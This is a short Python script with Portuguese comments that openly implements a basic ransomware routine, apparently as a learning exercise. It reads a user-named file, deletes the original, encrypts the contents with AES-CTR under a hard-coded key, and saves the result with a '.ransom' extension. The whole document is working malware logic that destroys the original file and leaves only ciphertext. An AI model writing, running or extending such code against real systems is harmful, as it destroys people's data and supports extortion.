import os
import pyaes

## solicitar o nome do arquivo a ser criptografado
file_name = input("Digite o nome do arquivo a ser criptografado: ")

## abrir o arquivo a ser criptografado
file = open(file_name, "rb")
file_data = file.read()
file.close()

## remover o arquivo
os.remove(file_name)

## chave de criptografia
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

## criptografar o arquivo
crypto_data = aes.encrypt(file_data)

## salvar o arquivo criptografado
new_file = file_name + ".ransom"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
